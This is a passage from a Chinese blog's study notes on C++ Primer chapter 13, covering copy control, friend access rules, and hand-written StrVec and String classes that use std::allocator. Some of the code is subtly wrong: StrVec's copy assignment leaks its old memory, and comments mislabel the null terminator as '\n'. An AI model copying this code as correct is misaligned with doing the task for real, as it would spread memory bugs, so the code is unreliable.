class="built_in">RemFld</span>(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Folder::<span class="built_in">Folder</span>(<span class="type">const</span> Folder &amp;f) : <span class="built_in">msgs</span>(f.msgs) &#123; <span class="built_in">AddToMessage</span>(f); &#125;</span><br><span class="line"></span><br><span class="line">Folder::~<span class="built_in">Folder</span>() &#123; <span class="built_in">RemoveFromMessage</span>(); &#125;</span><br><span class="line"></span><br><span class="line">Folder &amp;Folder::<span class="keyword">operator</span>=(<span class="type">const</span> Folder &amp;rhs) &#123;</span><br><span class="line">  <span class="built_in">RemoveFromMessage</span>();</span><br><span class="line">  msgs = rhs.msgs;  <span class="comment">// 运算符函数, 并非初始化函数, 不能使用初始化列表</span></span><br><span class="line">  <span class="built_in">AddToMessage</span>(rhs);</span><br><span class="line">  <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><h4 id="练习13-37">练习13.37</h4><p>Q: 我们并未使用拷贝交换方式来设计 <code>Message</code> 的赋值运算符。你认为其原因是什么？</p><p>A: 对于动态分配内存的例子来说，拷贝交换方式是一种简洁的设计。而这里的 <code>Message</code> 类并不需要动态分配内存，用拷贝交换方式只会增加实现的复杂度。</p><h3 id="踩坑：访问控制问题分析">踩坑：访问控制问题分析</h3><p>实验过程中遇到了一个有关访问控制的问题：</p><p><img src="/2023/12/03/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch13-%E6%8B%B7%E8%B4%9D%E6%8E%A7%E5%88%B6/191fdbd8c34973adf72faac239190d46.png" alt></p><p>问题原因：</p><ul><li><code>RemoveFromFolders</code> 是Message的成员函数，而Message类是Folder类的友元类，因此可以通过<code>RemoveFromFolders</code>来访问到Folder的private成员msgs。</li><li><code>swap</code>是Message的友元函数，通过友元函数能访问<code>RemoveFolders</code>（通过对象是访问不到private成员变量的）。</li><li>友元不具备传递性，<code>swap</code>中只能访问Message类的成员，并不能访问Folder类的成员（即使Message是Folder的友元类），因此<code>swap</code>中不能直接访问到msgs。</li></ul><blockquote><p><strong>访问权限</strong></p><table><thead><tr><th></th><th>public</th><th>protected</th><th>private</th></tr></thead><tbody><tr><td>成员是否可以访问</td><td>Yes</td><td>Yes</td><td>Yes</td></tr><tr><td>友元函数是否可以访问</td><td>Yes</td><td>Yes</td><td>Yes</td></tr><tr><td>子类是否可以访问</td><td>Yes</td><td>Yes</td><td>No</td></tr><tr><td>类的实例化对象是否可以访问</td><td>Yes</td><td>No</td><td>No</td></tr></tbody></table><p><strong>三种继承方式导致的权限变化</strong></p><table><thead><tr><th></th><th>public</th><th>protected</th><th>private</th></tr></thead><tbody><tr><td>public继承</td><td>public</td><td>protected</td><td>private</td></tr><tr><td>protected继承</td><td>protected</td><td>protected</td><td>private</td></tr><tr><td>private继承</td><td>private</td><td>private</td><td>private</td></tr></tbody></table></blockquote><h2 id="动态内存管理类">动态内存管理类</h2><ul><li>当使用allocator分配内存时，内存是未构造的，为了使用了此原始内存，必须调用construct在内存中构造一个对象。</li><li><code>uninitialized_copy</code>: Constructs copies of the elements in the range <em>[first,last)</em> into a range beginning at <em>result</em> and returns an iterator to the <strong>last</strong> element in the destination range.</li><li>destroy函数会运行string的析构函数，string的析构函数会释放掉string自己的内存。</li><li>拷贝赋值运算符在释放已有元素之前调用<code>alloc_n_copy</code>并保存结果，这样就可以处理自赋值情况。</li><li><code>alloc.construct(dest++, std::move(*elem++));</code>调用<code>move</code>返回的结果会令construct使用string的移动构造函数，构造出的每个string会从旧string那接管内存的所有权。</li><li>string移动构造函数的细节并未公开，但标准库保证“移后源（moved-from）string仍然保持一个有效的、可析构的状态。</li><li>通常不为move提供一个using声明（原因在P706），而是直接使用<code>std::move</code>。</li></ul><h3 id="StrVec">StrVec</h3><h4 id="头文件">头文件</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StrVec</span> &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">StrVec</span>() : <span class="built_in">elements</span>(<span class="literal">nullptr</span>), <span class="built_in">first_free</span>(<span class="literal">nullptr</span>), <span class="built_in">cap</span>(<span class="literal">nullptr</span>)&#123;&#125;;</span><br><span class="line">  <span class="built_in">StrVec</span>(std::initializer_list&lt;std::string&gt;);</span><br><span class="line">  <span class="built_in">StrVec</span>(<span class="type">const</span> StrVec &amp;);</span><br><span class="line">  StrVec &amp;<span class="keyword">operator</span>=(<span class="type">const</span> StrVec &amp;);</span><br><span class="line">  ~<span class="built_in">StrVec</span>();</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">push_back</span><span class="params">(<span class="type">const</span> std::string &amp;)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">size_t</span> <span class="title">size</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> first_free - elements; &#125;</span><br><span class="line">  <span class="function"><span class="type">size_t</span> <span class="title">capacity</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> cap - elements; &#125;</span><br><span class="line">  <span class="function">std::string *<span class="title">begin</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> elements; &#125;</span><br><span class="line">  <span class="function">std::string *<span class="title">end</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> first_free; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="type">static</span> std::allocator&lt;std::string&gt; alloc;  <span class="comment">// static声明</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">chk_n_alloc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">size</span>() == <span class="built_in">capacity</span>()) &#123;</span><br><span class="line">      <span class="built_in">reallocate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function">std::pair&lt;std::string *, std::string *&gt; <span class="title">alloc_n_copy</span><span class="params">(<span class="type">const</span> std::string *,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                       <span class="type">const</span> std::string *)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">free</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">reallocate</span><span class="params">()</span></span>;</span><br><span class="line">  std::string *elements;</span><br><span class="line">  std::string *first_free;</span><br><span class="line">  std::string *cap;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="源文件">源文件</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;StrVec.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::allocator&lt;std::string&gt; StrVec::alloc;  <span class="comment">// 类static成员的定义(不带static)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StrVec::push_back</span><span class="params">(<span class="type">const</span> std::string &amp;s)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">chk_n_alloc</span>();</span><br><span class="line">  alloc.<span class="built_in">construct</span>(first_free++, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::pair&lt;std::string *, std::string *&gt; <span class="title">StrVec::alloc_n_copy</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> std::string *b, <span class="type">const</span> std::string *e)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> data = alloc.<span class="built_in">allocate</span>(e - b);</span><br><span class="line">  <span class="comment">// Unlike algorithm copy, uninitialized_copy constructs the objects in-place,</span></span><br><span class="line">  <span class="comment">// instead of just copying them. This allows to obtain fully constructed</span></span><br><span class="line">  <span class="comment">// copies of the elements into a range of uninitialized memory</span></span><br><span class="line">  <span class="keyword">return</span> &#123;data, std::<span class="built_in">uninitialized_copy</span>(b, e, data)&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StrVec::free</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// for_each(elements, first_free, [](std::string &amp;str) &#123; alloc.destroy(&amp;str);</span></span><br><span class="line">  <span class="comment">// &#125;);</span></span><br><span class="line">  <span class="keyword">if</span> (elements) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> p = first_free; p != elements;) &#123;</span><br><span class="line">      alloc.<span class="built_in">destroy</span>(--p);</span><br><span class="line">    &#125;</span><br><span class="line">    alloc.<span class="built_in">deallocate</span>(elements, cap - elements);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拷贝控制成员</span></span><br><span class="line">StrVec::<span class="built_in">StrVec</span>(<span class="type">const</span> StrVec &amp;s) &#123;</span><br><span class="line">  <span class="keyword">auto</span> newdata = <span class="built_in">alloc_n_copy</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">  elements = newdata.first;</span><br><span class="line">  first_free = cap = newdata.second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">StrVec::~<span class="built_in">StrVec</span>() &#123; <span class="built_in">free</span>(); &#125;</span><br><span class="line"></span><br><span class="line">StrVec &amp;StrVec::<span class="keyword">operator</span>=(<span class="type">const</span> StrVec &amp;rhs) &#123;</span><br><span class="line">  <span class="keyword">auto</span> data = <span class="built_in">alloc_n_copy</span>(rhs.<span class="built_in">begin</span>(), rhs.<span class="built_in">end</span>());</span><br><span class="line">  elements = data.first;</span><br><span class="line">  first_free = cap = data.second;</span><br><span class="line">  <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StrVec::reallocate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> newcapacity = <span class="built_in">size</span>() ? <span class="number">2</span> * <span class="built_in">size</span>() : <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">auto</span> newdata = alloc.<span class="built_in">allocate</span>(newcapacity);</span><br><span class="line">  <span class="keyword">auto</span> dest = newdata;</span><br><span class="line">  <span class="keyword">auto</span> elem = elements;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i != <span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">    alloc.<span class="built_in">construct</span>(dest++, std::<span class="built_in">move</span>(*elem++));  <span class="comment">// 移动而非拷贝</span></span><br><span class="line">    <span class="comment">// 不知道移动后旧StrVec中string包含什么, 但保证对其析构是安全的</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>();</span><br><span class="line">  elements = newdata;</span><br><span class="line">  first_free = dest;</span><br><span class="line">  cap = elements + newcapacity;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">StrVec::<span class="built_in">StrVec</span>(std::initializer_list&lt;std::string&gt; il) &#123;</span><br><span class="line">  <span class="keyword">auto</span> newdata = <span class="built_in">alloc_n_copy</span>(il.<span class="built_in">begin</span>(), il.<span class="built_in">end</span>());</span><br><span class="line">  elements = newdata.first;</span><br><span class="line">  first_free = cap = newdata.second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><h5 id="static成员变量声明和定义的问题"><code>static</code>成员变量声明和定义的问题</h5><ol><li><p>类内<code>static std::allocator&lt;std::string&gt; alloc;</code>是声明，不是定义。<br>注意变量可以声明多次但只能定义一次，该变量在多个类的对象中共享（多个对象公有），所以是声明，只能是声明多次，但不能是定义多次。</p></li><li><p><strong>类外需要定义，否则会报链接时错误：</strong></p><p>类外使用默认初始化定义：<code>std::allocator&lt;std::string&gt; StrVec::alloc;</code></p><ul><li><p>需要在变量前写类名</p></li><li><p><strong>定义中不需要再使用<code>static</code></strong></p></li></ul></li><li><p>为什么要定义为<code>static</code>，不定义成<code>static</code>直接就是在类内定义也能跑？</p></li></ol><ul><li>这里应该主要是为了节约空间，让多个对象共享此变量。</li><li>但也有声音反对这种做法：静态函数不等同于<strong>静态成员变量</strong>，前者会大量使用，而后者在现代C++实践中会尽量避免，因为其<strong>生命周期</strong>不可控。就以 <code>StrVec</code> 的 <code>alloc</code> 为例，声明为 <code>static</code> 看似节省了空间，但破坏了对象的&quot;粒度&quot;，这个成员成了一个&quot;全局共享池&quot;，你甚至不清楚它会什么时候回收内存。其次，这一点点空间，压根没有必要节省，每个对象保证自己的 <code>alloc</code> 受自己控制，而不会和别的对象搅和到一起，这一点对于代码的清晰度来讲，是十分必要的。</li><li>C++11提供了<a href="http://en.cppreference.com/w/cpp/memory/allocator_traits/allocate">allocator_traits</a>, 提供了<code>allocate</code>的静态方法，也许是种更好的方法（TODO：本人还不会用，就先不介绍了）。</li></ul><p>推荐阅读：</p><ul><li><a href="https://en.cppreference.com/w/cpp/language/definition">Definitions and ODR (One Definition Rule) - cppreference.com</a></li></ul><h3 id="String">String</h3><h4 id="头文件-2">头文件</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span>  <span class="comment">// allocator</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">String</span> &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">String</span>() : <span class="built_in">String</span>(<span class="string">&quot;&quot;</span>) &#123;&#125;  <span class="comment">// 成员方法定义后不用加&#x27;;&#x27;</span></span><br><span class="line">  <span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>*);</span><br><span class="line">  <span class="built_in">String</span>(<span class="type">const</span> String&amp;);</span><br><span class="line">  String&amp; <span class="keyword">operator</span>=(<span class="type">const</span> String&amp;);</span><br><span class="line">  ~<span class="built_in">String</span>();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">size_t</span> <span class="title">length</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> cap - elements - <span class="number">1</span>; &#125;</span><br><span class="line">  <span class="function"><span class="type">size_t</span> <span class="title">size</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> cap - elements - <span class="number">1</span>; &#125;</span><br><span class="line">  <span class="function"><span class="type">char</span>* <span class="title">begin</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> elements; &#125;</span><br><span class="line">  <span class="function"><span class="type">char</span>* <span class="title">end</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> cap; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="type">char</span>* <span class="title">c_str</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> elements; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="type">char</span>* elements;</span><br><span class="line">  <span class="type">char</span>* cap;                          <span class="comment">// 指向&#x27;\n&#x27;尾后元素</span></span><br><span class="line">  <span class="type">static</span> std::allocator&lt;<span class="type">char</span>&gt; alloc;  <span class="comment">// static声明</span></span><br><span class="line"></span><br><span class="line">  <span class="function">std::pair&lt;<span class="type">char</span>*, <span class="type">char</span>*&gt; <span class="title">alloc_n_copy</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">const</span> <span class="type">char</span>*)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">free</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="源文件-2">源文件</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;String.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::allocator&lt;<span class="type">char</span>&gt; String::alloc;  <span class="comment">// static类成员定义</span></span><br><span class="line"></span><br><span class="line"><span class="function">std::pair&lt;<span class="type">char</span>*, <span class="type">char</span>*&gt; <span class="title">String::alloc_n_copy</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* b, <span class="type">const</span> <span class="type">char</span>* e)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> data = alloc.<span class="built_in">allocate</span>(e - b);</span><br><span class="line">  <span class="keyword">return</span> &#123;data, std::<span class="built_in">uninitialized_copy</span>(</span><br><span class="line">                    b, e, data)&#125;;  <span class="comment">// uninitialized_copy拷贝时前闭后开,</span></span><br><span class="line">                                   <span class="comment">// 返回最后一个元素之后的位置</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String::<span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>* s) &#123;</span><br><span class="line">  <span class="type">char</span>* e = <span class="built_in">const_cast</span>&lt;<span class="type">char</span>*&gt;(s);  <span class="comment">// &quot;const char *&quot; 类型的值不能用于初始化 &quot;char *&quot; 类型的实体</span></span><br><span class="line">  <span class="keyword">while</span> (*e) &#123;</span><br><span class="line">    ++e;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> newdata = <span class="built_in">alloc_n_copy</span>(s, ++e);  <span class="comment">// 第二个参数为最后一个元素&#x27;\n&#x27;尾后元素</span></span><br><span class="line">  elements = newdata.first;</span><br><span class="line">  cap = newdata.second;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String::<span class="built_in">String</span>(<span class="type">const</span> String&amp; rhs) &#123;</span><br><span class="line">  <span class="comment">// printf(&quot;%c %zu\n&quot;, *rhs.elements, rhs.length());</span></span><br><span class="line">  <span class="keyword">auto</span> newdata = <span class="built_in">alloc_n_copy</span>(rhs.elements, rhs.cap);</span><br><span class="line">  elements = newdata.first;</span><br><span class="line">  cap = newdata.second;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;copy constructor&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String&amp; String::<span class="keyword">operator</span>=(<span class="type">const</span> String&amp; rhs) &#123;</span><br><span class="line">  <span class="keyword">auto</span> newdata = <span class="built_in">alloc_n_copy</span>(rhs.elements, rhs.cap);</span><br><span class="line">  <span class="built_in">free</span>();</span><br><span class="line">  elements = newdata.first;</span><br><span class="line">  cap = newdata.second;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;copy-assignment&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">  <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">String::free</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (elements) &#123;</span><br><span class="line">    <span class="comment">// for (auto p = cap; p != elements;) &#123;</span></span><br><span class="line">    <span class="comment">//   alloc.destroy(--p);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    std::for_each(elements, cap, [](<span class="type">char</span>&amp; c) &#123; alloc.<span class="built_in">destroy</span>(&amp;c); &#125;);</span><br><span class="line">    alloc.<span class="built_in">deallocate</span>(elements, cap - elements);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String::~<span class="built_in">String</span>() &#123; <span class="built_in">free</span>(); &#125;</span><br></pre></td></tr></table></figure><h4 id="测试文件">测试文件</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;String.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Test reference to http://coolshell.cn/articles/10478.html</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">(String x)</span> </span>&#123; std::cout &lt;&lt; x.<span class="built_in">c_str</span>() &lt;&lt; std::endl; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bar</span><span class="params">(<span class="type">const</span> String&amp; x)</span> </span>&#123; std::cout &lt;&lt; x.<span class="built_in">c_str</span>() &lt;&lt; std::endl; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">String <span class="title">baz</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">String <span class="title">ret</span><span class="params">(<span class="string">&quot;world&quot;</span>)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> text[] = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"></span><br><span class="line">  String s0;</span><br><span class="line">  <span class="function">String <span class="title">s1</span><span class="params">(<span class="string">&quot;hello&quot;</span>)</span></span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;s1 = %s s1.length() = %zu s1.begin() = %c\n&quot;</span>, s1.<span class="built_in">c_str</span>(), s1.<span class="built_in">length</span>(),</span><br><span class="line">         *s1.<span class="built_in">begin</span>());</span><br><span class="line">  <span class="function">String <span class="title">s2</span><span class="params">(s1)</span></span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;s2 = %s s2.length() = %zu s2.begin() = %c\n&quot;</span>, s2.<span class="built_in">c_str</span>(), s2.<span class="built_in">length</span>(),</span><br><span class="line">         *s2.<span class="built_in">begin</span>());</span><br><span class="line">  String s3 = s1;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;s3 = %s s3.length() = %zu\n&quot;</span>, s3.<span class="built_in">c_str</span>(), s3.<span class="built_in">length</span>());</span><br><span class="line">  <span class="function">String <span class="title">s4</span><span class="params">(text)</span></span>;</span><br><span class="line">  s2 = s1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">foo</span>(s1);</span><br><span class="line">  <span class="built_in">bar</span>(s1);</span><br><span class="line">  <span class="built_in">foo</span>(<span class="string">&quot;temporary&quot;</span>);</span><br><span class="line">  <span class="built_in">bar</span>(<span class="string">&quot;temporary&quot;</span>);</span><br><span class="line">  String s5 = <span class="built_in">baz</span>();</span><br><span class="line"></span><br><span class="line">  std::vector&lt;String&gt; svec;</span><br><span class="line">  svec.<span class="built_in">reserve</span>(<span class="number">8</span>);</span><br><span class="line">  svec.<span class="built_in">push_back</span>(s0);</span><br><span class="line">  svec.<span class="built_in">push_back</span>(s1);</span><br><span class="line">  svec.<span class="built_in">push_back</span>(s2);</span><br><span class="line">  svec.<span class="built_in">push_back</span>(s3);</span><br><span class="line">  svec.<span class="built_in">push_back</span>(s4);</span><br><span class="line">  svec.<span class="built_in">push_back</span>(s5);</span><br><span class="line">  svec.<span class="built_in">push_back</span>(<span class="built_in">baz</span>());</span><br><span class="line">  svec.<span class="built_in">push_back</span>(<span class="string">&quot;good job&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; s : svec) &#123;</span><br><span class="line">    std::cout &lt;&lt; s.<span class="built_in">c_str</span>() &lt;&lt; std::endl;</span><br><span class="line">  &#125;</span><br><span 